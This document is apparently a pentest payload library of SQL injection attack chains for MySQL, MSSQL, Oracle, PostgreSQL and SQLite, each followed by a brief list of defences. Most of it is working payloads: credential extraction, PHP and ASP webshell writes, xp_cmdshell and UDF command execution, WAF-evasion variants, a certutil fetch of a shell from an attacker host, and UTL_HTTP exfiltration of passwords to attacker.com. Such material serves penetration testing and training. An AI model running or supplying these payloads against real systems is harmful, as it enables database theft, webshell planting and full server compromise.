# SQL/NoSQL Injection

_17 web payloads_

### MySQL Injection - Basic Probing  `sqli-mysql-basic`
_MySQL database injection basic probing and data extraction techniques_
Subcategory: **MySQL** · tags: `sqli` `mysql` `injection` `database`

**Prerequisites:**
- The target has a SQL injection point
- The backend database is MySQL
- Understanding of basic SQL syntax

**Attack Chain:**

**1. Probe for the injection point**
> Use single quotes and boolean conditions to probe whether an injection point exists
```
' OR '1'='1
' OR 1=1--
1' AND '1'='1
1' AND '1'='2
```
**Syntax breakdown:**
- `OR '1'='1'` — logically always true _keyword_
- `--` — SQL comment _operator_

**2. Determine the number of columns**
> Use ORDER BY or UNION SELECT NULL to determine the number of query columns
```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
Until an error occurs, determining the number of columns
Or use:
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```
**Syntax breakdown:**
- `ORDER BY` — sort by the specified column _value_
- `NULL` — null value placeholder _keyword_

**3. Determine the display position**
> Find out which columns are displayed on the page
```
' UNION SELECT 1,2,3--
' UNION SELECT 'a','b','c'--
```
**Syntax breakdown:**
- `UNION SELECT` — union query, merge the result sets _value_
- `1,2,3` — numeric markers for the display positions _value_

**4. Obtain database information**
> Obtain basic information such as the current database name, user, and version
```
' UNION SELECT 1,database(),3--
' UNION SELECT 1,user(),3--
' UNION SELECT 1,version(),3--
' UNION SELECT 1,@@hostname,3--
```
**Syntax breakdown:**
- `database()` — returns the current database name _function_
- `user()` — returns the current user _function_
- `version()` — returns the MySQL version _function_

**5. Enumerate all databases**
> Obtain all database names on the MySQL server
```
' UNION SELECT 1,group_concat(schema_name),3 FROM information_schema.schemata--
' UNION SELECT schema_name,2,3 FROM information_schema.schemata LIMIT 0,1--
```
**Syntax breakdown:**
- `information_schema` — the MySQL system database that stores metadata _keyword_
- `schemata` — the table that stores all database names _value_
- `group_concat()` — merges multiple rows into one row _function_

**6. Enumerate table names**
> Obtain all table names in the specified database
```
' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--
' UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema='target_db' LIMIT 0,1--
```
**Syntax breakdown:**
- `information_schema.tables` — the system table that stores all table information _value_
- `table_schema` — the database name the table belongs to _value_
- `table_name` — table name _value_

**7. Enumerate column names**
> Obtain all column names of the specified table
```
' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users' AND table_schema=database() LIMIT 0,1--
```
**Syntax breakdown:**
- `information_schema.columns` — the system table that stores all column information _value_
- `column_name` — column name _value_

**8. Extract data**
> Extract sensitive data from the target table
```
' UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users--
' UNION SELECT username,password,3 FROM users LIMIT 0,1--
```
**Syntax breakdown:**
- `0x3a` — the hexadecimal of a colon, used as a separator _encoding_
- `LIMIT 0,1` — limit to returning the first row of results _value_

**WAF/EDR Bypass Variants:**

**Case obfuscation**
> Use mixed case to bypass keyword filtering
```
' UnIoN SeLeCt 1,database(),3--
' uNiOn SeLeCt 1,user(),3--
```
**Syntax breakdown:**
- `UnIoN SeLeCt` — mixed case to bypass simple keyword matching _value_

**Inline comment**
> Use the MySQL-specific inline comment to bypass
```
' /*!UNION*/ /*!SELECT*/ 1,database(),3--
' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3--
```
**Syntax breakdown:**
- `/*!UNION*/` — MySQL executes the SQL inside the comment _value_
- `/*!50000` — execute on MySQL version 5.00.00 and above _value_

**Double-write bypass**
> Double-write the keyword to bypass replacement filtering
```
' UNUNIONION SELSELECTECT 1,database(),3--
' UNIunionON SELselectECT 1,2,3--
```
**Syntax breakdown:**
- `UNUNIONION` — after the WAF removes UNION it becomes UNION _value_
- `SELSELECTECT` — after the WAF removes SELECT it becomes SELECT _value_

**Space substitution**
> Use comments, newlines, and parentheses to replace spaces
```
'/**/UNION/**/SELECT/**/1,database(),3--
' %0aUNION%0aSELECT%0a1,2,3--
'(UNION(SELECT(1),(database()),(3)))--
```
**Syntax breakdown:**
- `/**/` — comment substituting for a space _operator_
- `%0a` — URL encoding of a newline _encoding_
- `()` — parentheses wrapping to replace a space _value_

**Encoding bypass**
> Use encoding functions to bypass keyword detection
```
' UNION SELECT 1,hex(database()),3--
' UNION SELECT 1,unhex(hex(database())),3--
' UNION SELECT 1,conv(hex(database()),16,10),3--
```
**Syntax breakdown:**
- `hex()` — hexadecimal encoding _function_
- `unhex()` — hexadecimal decoding _function_
- `conv()` — base conversion _function_

**Overview:** MySQL injection is the most common type of database injection, obtaining or modifying database data by constructing malicious SQL statements. An attacker can use the injection vulnerability to read sensitive data, write a WebShell, or even execute system commands.

**Vulnerability Principle:** The application does not adequately filter user input and concatenates it directly into the SQL statement for execution. Common in input points such as search boxes, login forms, and URL parameters.

**Exploitation Method:** Complete exploitation flow:
1. Probe for the injection point: use single quotes and boolean conditions to confirm whether injection exists
2. Determine the number of columns: use ORDER BY or UNION SELECT NULL
3. Determine the display position: find out which columns are echoed to the page
4. Obtain database information: database(), user(), version()
5. Enumerate the database structure: the information_schema database
6. Extract sensitive data: usernames, passwords, etc.
7. Attempt privilege escalation: file read/write, UDF privilege escalation

**Defensive Measures:** Defenses:
1. Use parameterized queries (PDO, prepared statements)
2. Input validation and allowlist filtering
3. Least privilege principle, restrict database user permissions
4. Disable or restrict the FILE permission
5. Set secure_file_priv to NULL
6. Deploy WAF protection
7. Error messages must not leak database details

---

### MySQL Injection - Advanced Techniques  `sqli-mysql-advanced`
_MySQL advanced injection techniques: file read/write, UDF privilege escalation, command execution_
Subcategory: **MySQL** · tags: `sqli` `mysql` `advanced` `file-read` `rce`

**Prerequisites:**
- The MySQL user has the FILE permission
- The absolute path of the website is known
- The secure_file_priv configuration allows it

**Attack Chain:**

**1. Detect the FILE permission**
> Detect whether the current user has the FILE permission
```
' UNION SELECT 1,file_priv,3 FROM mysql.user WHERE user=current_user()--
' AND (SELECT file_priv FROM mysql.user WHERE user=current_user())='Y'--
```
**Syntax breakdown:**
- `mysql.user` — the MySQL user permission table _value_
- `file_priv` — the FILE permission field _value_
- `current_user()` — returns the current user _function_

**2. Obtain the website path**
> Obtain the website path via error messages or by reading a file
```
' UNION SELECT 1,@@basedir,3--
' UNION SELECT 1,@@datadir,3--
' UNION SELECT 1,load_file('/etc/passwd'),3--
```
**Syntax breakdown:**
- `@@basedir` — the MySQL installation directory _value_
- `@@datadir` — the MySQL data directory _value_

**3. Read sensitive files**
> Use load_file to read sensitive system files
```
' UNION SELECT 1,load_file('/etc/passwd'),3--
' UNION SELECT 1,load_file('/var/www/html/config.php'),3--
' UNION SELECT 1,load_file('C:/windows/win.ini'),3--
```
**Syntax breakdown:**
- `load_file()` — the MySQL file read function _function_
- `/etc/passwd` — the Linux user information file _path_

**4. Write a WebShell**
> Use INTO OUTFILE to write a WebShell
_platform: linux_
```
' UNION SELECT 1,'<?php @eval($_POST[cmd]);?>',3 INTO OUTFILE '/var/www/html/shell.php'--
' UNION SELECT 1,'<?php system($_GET[c]);?>',3 INTO OUTFILE '/var/www/html/cmd.php'--
```
**Syntax breakdown:**
- `UNION` — merge query results _keyword_
- `SELECT` — query data _keyword_
- `INTO OUTFILE` — write to a file _keyword_
- `--` — SQL comment _operator_
- `system()` — system command execution _function_
- `eval()` — code execution _function_

**5. Log-based shell writing**
> Write a shell by enabling general_log
_platform: linux_
```
SET GLOBAL general_log='ON';
SET GLOBAL general_log_file='/var/www/html/shell.php';
SELECT '<?php @eval($_POST[cmd]);?>';
```
**Syntax breakdown:**
- `general_log` — the MySQL general query log switch _value_
- `general_log_file` — the log file path _value_

**6. UDF privilege escalation**
> Use UDF privilege escalation to execute system commands
_platform: linux_
```
SELECT load_file('/tmp/lib_mysqludf_sys.so') INTO DUMPFILE '/usr/lib/mysql/plugin/lib_mysqludf_sys.so';
CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys.so';
SELECT sys_eval('id');
```
**Syntax breakdown:**
- `INTO DUMPFILE` — write to a binary file _keyword_
- `CREATE FUNCTION` — create a custom function _value_
- `sys_eval` — the UDF function that executes system commands _value_

**WAF/EDR Bypass Variants:**

**Hex encoding write**
> Use hexadecimal encoding to bypass keyword detection
_platform: linux_
```
' UNION SELECT 1,0x3c3f70687020406576616c28245f504f53545b636d645d293b3f3e,3 INTO DUMPFILE '/var/www/html/shell.php'--
```
**Syntax breakdown:**
- `0x3c3f706870...` — the hexadecimal encoding of the PHP one-liner _value_
- `INTO DUMPFILE` — write to a binary file _keyword_

**Char encoding bypass**
> Use the CHAR function encoding to bypass
_platform: linux_
```
' UNION SELECT 1,CHAR(60,63,112,104,112,32,64,101,118,97,108,40,36,95,80,79,83,84,91,99,109,100,93,41,59,63,62),3 INTO OUTFILE '/var/www/html/s.php'--
```
**Syntax breakdown:**
- `CHAR(60,63...)` — construct a string using ASCII code values _value_

**Overview:** MySQL advanced injection techniques can achieve file reading, WebShell writing, and even system command execution. These techniques require higher database permissions and specific configuration conditions.

**Vulnerability Principle:** MySQL's FILE permission allows reading and writing files; combined with a misconfigured secure_file_priv, it can lead to serious consequences. UDF privilege escalation can execute arbitrary system commands.

**Exploitation Method:** Complete exploitation flow:
1. Detect the FILE permission and secure_file_priv configuration
2. Obtain the website's absolute path
3. Use load_file to read sensitive configuration
4. Use INTO OUTFILE to write a WebShell
5. If OUTFILE is disabled, use log-based shell writing
6. Attempt UDF privilege escalation to obtain a system shell

**Defensive Measures:** Defenses:
1. Restrict the FILE permission, do not grant it to the web application user
2. Set secure_file_priv=NULL to prohibit file operations
3. Disable INTO OUTFILE and INTO DUMPFILE
4. Use AppArmor/SELinux to restrict MySQL file access
5. Monitor abnormal file read/write operations

---

### MSSQL Injection - Basic Probing  `sqli-mssql-basic`
_Microsoft SQL Server database injection techniques_
Subcategory: **MSSQL** · tags: `sqli` `mssql` `sqlserver` `injection`

**Prerequisites:**
- The target has a SQL injection point
- The backend uses an MSSQL database

**Attack Chain:**

**1. Probe for the injection point**
> Basic injection probing
```
' OR 1=1--
' OR '1'='1
1' AND 1=1--
1' AND 1=2--
```
**Syntax breakdown:**
- `--` — MSSQL single-line comment symbol _operator_
- `OR 1=1` — always-true condition _value_

**2. Obtain version information**
> Obtain MSSQL version information
```
' UNION SELECT 1,@@version,3--
' UNION SELECT 1,SERVERPROPERTY('Edition'),3--
' UNION SELECT 1,SERVERPROPERTY('ProductVersion'),3--
```
**Syntax breakdown:**
- `@@version` — returns the SQL Server version _value_
- `SERVERPROPERTY()` — returns server property information _function_

**3. Obtain user information**
> Obtain the current user and permission information
```
' UNION SELECT 1,user_name(),3--
' UNION SELECT 1,suser_name(),3--
' UNION SELECT 1,system_user,3--
' UNION SELECT 1,is_srvrolemember('sysadmin'),3--
```
**Syntax breakdown:**
- `user_name()` — returns the current database user _function_
- `suser_name()` — returns the login name _function_
- `is_srvrolemember()` — checks whether it belongs to a server role _function_

**4. Obtain database information**
> Obtain all database names
```
' UNION SELECT 1,db_name(),3--
' UNION SELECT 1,db_name(0),3--
' UNION SELECT 1,db_name(1),3--
' UNION SELECT name,2,3 FROM master..sysdatabases--
```
**Syntax breakdown:**
- `db_name()` — returns the current database name _function_
- `db_name(N)` — returns the Nth database name _value_
- `master..sysdatabases` — the system database that stores all database information _value_

**5. Obtain table names**
> Obtain user table names
```
' UNION SELECT 1,name,3 FROM sysobjects WHERE xtype='U'--
' UNION SELECT 1,name,3 FROM sys.tables--
' UNION SELECT 1,table_name,3 FROM information_schema.tables--
```
**Syntax breakdown:**
- `UNION` — merge query results _keyword_
- `SELECT...FROM` — query data _keyword_
- `WHERE` — condition filtering _keyword_
- `information_schema` — the metadata database _value_
- `--` — SQL comment _operator_

**6. Obtain column names**
> Obtain the column names of the specified table
```
' UNION SELECT 1,name,3 FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users')--
' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'--
```
**Syntax breakdown:**
- `syscolumns` — the system column information table _value_
- `information_schema.columns` — the standard information schema view _value_

**7. Extract data**
> Extract data from the table
```
' UNION SELECT 1,username+':'+password,3 FROM users--
' UNION SELECT TOP 1 username,password,3 FROM users--
```
**Syntax breakdown:**
- `+` — MSSQL string concatenation operator _operator_
- `TOP 1` — returns the first record _value_

**WAF/EDR Bypass Variants:**

**Hex encoding**
> Use Hex encoding to bypass
```
' UNION SELECT 1,master.dbo.fn_varbintohexstr(CAST(username AS VARBINARY)),3 FROM users--
```
**Syntax breakdown:**
- `fn_varbintohexstr()` — converts to a hexadecimal string _function_

**Comment bypass**
> Use comments and null bytes to bypass
```
'/**/UNION/**/SELECT/**/1,2,3--
' UN%00ION SELECT 1,2,3--
```
**Syntax breakdown:**
- `UNION` — merge query results _keyword_
- `SELECT` — query data _keyword_
- `--` — SQL comment _operator_
- `/*...*/` — inline comment _operator_
- `%xx` — URL encoding _encoding_

**Overview:** MSSQL injection is similar to MySQL, but the syntax and system tables differ. MSSQL provides more powerful stored procedures that can execute system commands.

**Vulnerability Principle:** The application does not adequately filter user input and concatenates it directly into the SQL statement for execution. MSSQL-specific stored procedures increase the attack surface.

**Exploitation Method:** Complete exploitation flow:
1. Probe the injection point type
2. Obtain version and user information
3. Enumerate the database structure
4. Extract sensitive data
5. Attempt to use xp_cmdshell to execute commands

**Defensive Measures:** Defenses:
1. Use parameterized queries
2. Least privilege principle
3. Disable dangerous stored procedures such as xp_cmdshell
4. Use stored procedures to encapsulate business logic

---

### MSSQL Injection - Advanced Techniques  `sqli-mssql-advanced`
_MSSQL advanced injection: xp_cmdshell, SP_OACREATE command execution_
Subcategory: **MSSQL** · tags: `sqli` `mssql` `xp_cmdshell` `rce`

**Prerequisites:**
- MSSQL has high privileges
- xp_cmdshell is available or can be enabled

**Attack Chain:**

**1. Detect the xp_cmdshell status**
> Detect whether xp_cmdshell is available
_platform: windows_
```
' UNION SELECT 1,OBJECT_ID('xp_cmdshell'),3--
'; EXEC master..xp_cmdshell 'whoami'--
```
**Syntax breakdown:**
- `OBJECT_ID()` — checks whether the object exists _function_
- `xp_cmdshell` — the extended stored procedure for executing system commands _keyword_

**2. Enable xp_cmdshell**
> If xp_cmdshell is disabled, try to enable it
_platform: windows_
```
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--
```
**Syntax breakdown:**
- `xp_cmdshell` — system command execution _function_
- `EXEC` — execute a stored procedure _keyword_
- `--` — SQL comment _operator_

**3. Execute system commands**
> Use xp_cmdshell to execute system commands
_platform: windows_
```
'; EXEC master..xp_cmdshell 'whoami'--
'; EXEC master..xp_cmdshell 'net user'--
'; EXEC master..xp_cmdshell 'dir C:'--
```
**Syntax breakdown:**
- `master..xp_cmdshell` — call xp_cmdshell in the master database _value_

**4. Write a WebShell**
> Write or download a WebShell
_platform: windows_
```
'; EXEC master..xp_cmdshell 'echo ^<%execute(request("cmd"))^> > C:\inetpub\wwwroot\shell.asp'--
'; EXEC master..xp_cmdshell 'certutil -urlcache -split -f http://attacker/shell.aspx C:\inetpub\wwwroot\shell.aspx'--
```
**Syntax breakdown:**
- `echo` — write file content _command_
- `certutil` — the Windows built-in download tool _value_

**5. SP_OACREATE method**
> Use SP_OACREATE to execute commands
_platform: windows_
```
'; EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;
DECLARE @shell INT;
EXEC SP_OACREATE 'wscript.shell', @shell OUTPUT;
EXEC SP_OAMETHOD @shell, 'run', NULL, 'cmd /c whoami > C:\output.txt';--
```
**Syntax breakdown:**
- `SP_OACREATE` — create an OLE automation object _keyword_
- `wscript.shell` — the Windows Script Host object _value_
- `SP_OAMETHOD` — call an object method _value_

**WAF/EDR Bypass Variants:**

**Stacked queries**
> Use dynamic SQL to bypass
_platform: windows_
```
'; EXEC('EXEC master..xp_cmdshell ''whoami''')--
'; DECLARE @cmd VARCHAR(255); SET @cmd='whoami'; EXEC master..xp_cmdshell @cmd;--
```
**Syntax breakdown:**
- `EXEC()` — execute dynamic SQL _function_
- `DECLARE` — declare a variable _keyword_

**Overview:** MSSQL advanced injection uses stored procedures such as xp_cmdshell and SP_OACREATE to execute system commands, achieving full control of the server.

**Vulnerability Principle:** MSSQL advanced injection uses database-specific functionality such as the xp_cmdshell stored procedure to execute system commands, OPENROWSET for out-of-band data exfiltration, and stacked queries to execute multiple SQL statements. MSSQL error messages are usually detailed, and error-based injection can extract sensitive information such as the database version and table structure.

**Exploitation Method:** Complete exploitation flow:
1. Detect the current user's permissions
2. Attempt to enable xp_cmdshell
3. Execute system commands
4. Write a WebShell or add a user
5. If xp_cmdshell is disabled, attempt SP_OACREATE

**Defensive Measures:** Defenses:
1. Disable xp_cmdshell and Ole Automation Procedures
2. Use a least-privilege account
3. Use stored procedures to encapsulate business logic
4. Deploy WAF protection

---

### Oracle Injection - Basic Probing  `sqli-oracle-basic`
_Oracle database injection basic techniques_
Subcategory: **Oracle** · tags: `sqli` `oracle` `injection`

**Prerequisites:**
- The target has a SQL injection point
- The backend uses an Oracle database

**Attack Chain:**

**1. Probe for the injection point**
> Probe the injection point type
```
' OR 1=1--
' OR '1'='1
' UNION SELECT NULL,NULL,NULL FROM DUAL--
```
**Syntax breakdown:**
- `FROM DUAL` — the Oracle virtual table, SELECT must have a FROM _value_
- `NULL,NULL,NULL` — probe the number of columns _value_

**2. Obtain version information**
> Obtain the Oracle version
```
' UNION SELECT banner,NULL FROM v$version WHERE rownum=1--
' UNION SELECT version,NULL FROM v$instance--
```
**Syntax breakdown:**
- `v$version` — the Oracle version information view _value_
- `v$instance` — the instance information view _value_
- `rownum=1` — limit to returning one row _value_

**3. Obtain user information**
> Obtain the database user
```
' UNION SELECT username,NULL FROM all_users--
' UNION SELECT user,NULL FROM DUAL--
' UNION SELECT SYS_CONTEXT('USERENV','SESSION_USER'),NULL FROM DUAL--
```
**Syntax breakdown:**
- `all_users` — the all users view _value_
- `user` — the current user _value_
- `SYS_CONTEXT` — obtain session context information _value_

**4. Obtain table names**
> Obtain table names
```
' UNION SELECT table_name,NULL FROM all_tables WHERE owner='SCOTT'--
' UNION SELECT owner||'.'||table_name,NULL FROM all_tables--
```
**Syntax breakdown:**
- `all_tables` — the all tables view _value_
- `owner` — the user the table belongs to _value_
- `||` — the Oracle string concatenation operator _operator_

**5. Obtain column names**
> Obtain column names and data types
```
' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS'--
' UNION SELECT column_name||':'||data_type,NULL FROM all_tab_columns WHERE table_name='USERS'--
```
**Syntax breakdown:**
- `all_tab_columns` — the all columns information view _value_
- `data_type` — column data type _value_

**6. Extract data**
> Extract table data
```
' UNION SELECT username||':'||password,NULL FROM users--
' UNION SELECT * FROM (SELECT username,password FROM users) WHERE rownum<=1--
```
**Syntax breakdown:**
- `rownum<=1` — the Oracle pagination method _value_

**WAF/EDR Bypass Variants:**

**UTL_HTTP exfiltration**
> Use UTL_HTTP to exfiltrate data
```
' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT password FROM users WHERE rownum=1)),NULL FROM DUAL--
```
**Syntax breakdown:**
- `UTL_HTTP.REQUEST()` — initiate an HTTP request _function_

**Overview:** Oracle database injection requires mastering the specific syntax and system views. Oracle provides a rich set of built-in packages that can achieve more functionality.

**Vulnerability Principle:** The particularity of Oracle database injection lies in its strict syntax requirements: SELECT must have a FROM clause (the dual pseudo-table can be used), string concatenation uses the || operator, and comments use -- rather than #. Oracle's data dictionary (all_tables/all_tab_columns) is the key entry point for information enumeration.

**Exploitation Method:** Complete exploitation flow:
1. Probe the injection point and number of columns
2. Obtain the database version and user
3. Enumerate tables and columns
4. Extract sensitive data
5. Attempt to use packages such as UTL_HTTP to exfiltrate data

**Defensive Measures:** Defenses:
1. Use parameterized queries
2. Least privilege principle
3. Disable dangerous packages such as UTL_HTTP
4. Use DBMS_ASSERT to validate input

---

### Oracle Injection - Advanced Techniques  `sqli-oracle-advanced`
_Oracle advanced injection techniques: Java stored procedures, UTL_FILE file operations_
Subcategory: **Oracle** · tags: `sqli` `oracle` `advanced` `rce`

**Prerequisites:**
- Oracle high privileges
- The Java virtual machine is available

**Attack Chain:**

**1. Detect Java permissions**
> Detect whether Java stored procedures are available
```
' UNION SELECT 1,CASE WHEN DBMS_JAVA.TEST_OUTPUT('test') IS NOT NULL THEN 'YES' ELSE 'NO' END FROM DUAL--
```
**Syntax breakdown:**
- `DBMS_JAVA` — the Oracle Java package _value_
- `TEST_OUTPUT` — test the Java functionality _value_

**2. Create a Java execution function**
> Use Java to execute system commands
```
' UNION SELECT 1,(SELECT DBMS_JAVA.RUNJAVA('java.lang.Runtime.exec("cmd /c whoami")') FROM DUAL)--
```
**Syntax breakdown:**
- `DBMS_JAVA.RUNJAVA` — execute Java code _value_
- `Runtime.exec` — Java executes a system command _value_

**3. UTL_FILE to read files**
> Use UTL_FILE to operate on files
```
' UNION SELECT 1,UTL_FILE.FGETATTR('DATA_PUMP_DIR','/etc/passwd','file_exists') FROM DUAL--
```
**Syntax breakdown:**
- `UTL_FILE` — the Oracle file operation package _value_
- `DATA_PUMP_DIR` — an Oracle directory object _value_

**WAF/EDR Bypass Variants:**

**Oracle-specific function bypass**
> Use Oracle-specific functions such as XMLType, DBMS_PIPE, and CASE expressions to bypass WAF keyword detection
```
' UNION SELECT 1,XMLType('<root>'||CHR(60)||'data'||CHR(62)||user||'</data></root>') FROM DUAL--
' UNION SELECT 1,DBMS_PIPE.PACK_MESSAGE(user)||DBMS_PIPE.SEND_MESSAGE('pipe1') FROM DUAL--
' UNION SELECT 1,CASE WHEN (SELECT user FROM DUAL)='SYS' THEN 'admin' ELSE 'user' END FROM DUAL--
```
**Syntax breakdown:**
- `UNION` — merge query results _keyword_
- `SELECT...FROM` — query data _keyword_
- `CASE WHEN` — conditional expression _keyword_
- `--` — SQL comment _operator_

**Oracle comment and encoding bypass**
> Use comment symbols to replace spaces, CHR() to encode strings, and RAWTOHEX/UTL_ENCODE for data encoding bypass
```
' UNION/**/SELECT/**/1,user/**/FROM/**/DUAL--
' UNION SELECT 1,CHR(65)||CHR(68)||CHR(77)||CHR(73)||CHR(78) FROM DUAL--
' UNION SELECT 1,RAWTOHEX(user) FROM DUAL--
' UNION SELECT 1,UTL_RAW.CAST_TO_VARCHAR2(UTL_ENCODE.BASE64_ENCODE(UTL_RAW.CAST_TO_RAW(user))) FROM DUAL--
```
**Syntax breakdown:**
- `UNION` — merge query results _keyword_
- `SELECT...FROM` — query data _keyword_
- `HEX()` — hexadecimal encoding _encoding_
- `--` — SQL comment _operator_
- `/*...*/` — inline comment _operator_
- `base64` — Base64 encoding _encoding_

**Overview:** Oracle advanced injection techniques use Oracle-specific functionality such as PL/SQL blocks, UTL_HTTP for out-of-band communication, DBMS_PIPE for time-based injection, and XMLType for error-based injection for in-depth exploitation.

**Vulnerability Principle:** Oracle advanced vulnerabilities include: DNS out-of-band data exfiltration via UTL_HTTP/UTL_INADDR, using DBMS_XMLGEN to construct error-based echo, PL/SQL injection to bypass the single-statement restriction, and Java stored procedure privilege escalation to execute system commands.

**Exploitation Method:** Complete exploitation flow:
1. Detect Java permissions
2. Use DBMS_JAVA to execute commands
3. Or use UTL_FILE to read/write files

**Defensive Measures:** Defending against Oracle advanced injection requires: restricting database user permissions (revoke the EXECUTE permission for packages such as UTL_HTTP and DBMS_XMLGEN), enabling Oracle auditing, using bind variables rather than string concatenation, and configuring a network ACL to restrict outbound connections.

---

### PostgreSQL Injection - Basic Probing  `sqli-postgres-basic`
_PostgreSQL database injection techniques_
Subcategory: **PostgreSQL** · tags: `sqli` `postgresql` `postgres` `injection`

**Prerequisites:**
- The target has a SQL injection point
- The backend uses PostgreSQL

**Attack Chain:**

**1. Probe for the injection point**
> Probe for the injection point
```
' OR 1=1--
' OR '1'='1
' UNION SELECT NULL,NULL,NULL--
```
**Syntax breakdown:**
- `--` — PostgreSQL comment symbol _operator_

**2. Obtain version information**
> Obtain database information
```
' UNION SELECT version(),NULL--
' UNION SELECT current_database(),NULL--
' UNION SELECT current_user,NULL--
```
**Syntax breakdown:**
- `version()` — the PostgreSQL version _function_
- `current_database()` — the current database _function_
- `current_user` — the current user _value_

**3. Obtain table names**
> Obtain the tables in the public schema
```
' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='public'--
```
**Syntax breakdown:**
- `information_schema.tables` — the standard table information view _value_
- `table_schema` — the schema name, public is the default schema _value_

**4. Obtain column names**
> Obtain column names
```
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
```
**Syntax breakdown:**
- `UNION` — merge query results _keyword_
- `SELECT...FROM` — query data _keyword_
- `WHERE` — condition filtering _keyword_
- `information_schema` — the metadata database _value_
- `--` — SQL comment _operator_

**5. Read files**
> Use pg_read_file to read files
_platform: linux_
```
' UNION SELECT pg_read_file('/etc/passwd'),NULL--
' UNION SELECT pg_read_binary_file('/etc/passwd'),NULL--
```
**Syntax breakdown:**
- `pg_read_file()` — PostgreSQL read text file _function_
- `pg_read_binary_file()` — read a binary file _function_

**6. Write files**
> Use COPY to write files
_platform: linux_
```
' UNION SELECT 'test',COPY (SELECT '<?php system($_GET[c]);?>') TO '/var/www/html/shell.php'--
```
**Syntax breakdown:**
- `COPY` — the PostgreSQL COPY command _value_
- `TO` — specify the output file _value_

**WAF/EDR Bypass Variants:**

**Encoding bypass**
> Use the chr function to encode
```
' UNION SELECT chr(60)||chr(63)||'php system($_GET[c]);'||chr(63)||chr(62),NULL--
```
**Syntax breakdown:**
- `chr()` — returns an ASCII character _function_

**Overview:** PostgreSQL injection is similar to other databases, but it has its own specific functions and syntax. PostgreSQL provides a rich set of file operation functions.

**Vulnerability Principle:** PostgreSQL injection uses its rich type conversion system and function library: trigger error-based echo via CAST/type conversion, use pg_sleep() for time-based blind injection, COPY TO/FROM for file read/write operations, and create custom functions via PL/pgSQL to execute system commands.

**Exploitation Method:** Complete exploitation flow:
1. Probe for the injection point
2. Obtain database information
3. Enumerate tables and columns
4. Use pg_read_file to read files
5. Use COPY to write a WebShell

**Defensive Measures:** Defenses:
1. Use parameterized queries
2. Disable functions such as pg_read_file
3. Least privilege principle

---

### SQLite Injection  `sqli-sqlite-basic`
_SQLite database injection attack_
Subcategory: **SQLite** · tags: `sqli` `sqlite`

**Prerequisites:**
- SQLite database
- An injection point exists

**Attack Chain:**

**1. Probe for the injection point**
> Probe for the injection point
```
' OR 1=1--
' UNION SELECT 1,2,3--
' UNION SELECT NULL,NULL,NULL--
```
**Syntax breakdown:**
- `UNION` — merge query result sets _keyword_
- `SELECT` — query data _keyword_
- `--` — SQL comment _operator_

**2. Obtain the version**
> Obtain the SQLite version
```
' UNION SELECT sqlite_version(),NULL--
```
**Syntax breakdown:**
- `sqlite_version()` — the SQLite version function _function_

**3. Obtain table names**
> Obtain all table names
```
' UNION SELECT name,NULL FROM sqlite_master WHERE type='table'--
```
**Syntax breakdown:**
- `UNION` — merge query result sets _keyword_
- `SELECT` — query data _keyword_
- `--` — SQL comment _operator_

**4. Obtain the table structure**
> Obtain the table creation statement
```
' UNION SELECT sql,NULL FROM sqlite_master WHERE name='users'--
```
**Syntax breakdown:**
- `sql` — the table creation SQL statement _value_

**5. Read files**
> Read files (requires an extension)
```
' UNION SELECT load_extension('libsqlite3.so'),NULL--
' UNION SELECT readfile('/etc/passwd'),NULL--
```
**Syntax breakdown:**
- `load_extension` — load an extension library _value_
- `readfile` — read a file (requires an extension) _value_

**WAF/EDR Bypass Variants:**

**SQLite character encoding bypass**
> Use the CHAR() function to construct strings, the X-prefixed hexadecimal literal, and typeof() and unicode() for type inference blind injection to bypass the WAF
```
' UNION SELECT CHAR(116,101,115,116),NULL--
' UNION SELECT X'746573746461746131',NULL--
' AND typeof(CASE WHEN unicode(substr((SELECT name FROM sqlite_master LIMIT 1),1,1))>96 THEN 1 ELSE 0.0 END)='integer'--
```
**Syntax breakdown:**
- `UNION` — merge query results _keyword_
- `SELECT...FROM` — query data _keyword_
- `CASE WHEN` — conditional expression _keyword_
- `SUBSTRING` — string substring _function_
- `--` — SQL comment _operator_

**SQLite operator and function substitution**
> Use LIKE/GLOB pattern matching to replace the equals sign, instr() to replace SUBSTRING, and group_concat combined with replace to obfuscate data
```
' AND (SELECT name FROM sqlite_master WHERE type='table' AND name LIKE '%user%')--
' AND (SELECT name FROM sqlite_master WHERE type='table' AND name GLOB '*user*')--
' UNION SELECT replace(group_concat(name,','),'_',''),NULL FROM sqlite_master WHERE type='table'--
' AND instr((SELECT sql FROM sqlite_master LIMIT 1),'password')>0--
```
**Syntax breakdown:**
- `UNION` — merge query results _keyword_
- `SELECT...FROM` — query data _keyword_
- `WHERE` — condition filtering _keyword_
- `CONCAT` — string concatenation _function_
- `GROUP_CONCAT` — grouped concatenation _function_
- `--` — SQL comment _operator_

**Overview:** SQLite is an embedded database engine, widely used in mobile applications, desktop software, and small web applications. Its injection testing requires understanding the SQLite-specific syntax and the system table (sqlite_master) structure.

**Vulnerability Principle:** The particularity of SQLite injection lies in: enumerating all table and view definitions via the sqlite_master table, using typeof() to determine column types, using group_concat() to aggregate multi-row data, and ATTACH DATABASE to create a new database file to achieve file writing.

**Exploitation Method:** SQLite injection exploitation steps: 1) obtain the table structure via sqlite_master 2) use UNION SELECT to extract data 3) use ATTACH DATABASE to write a webshell to an accessible directory 4) or load a malicious shared library via load_extension() to execute code.

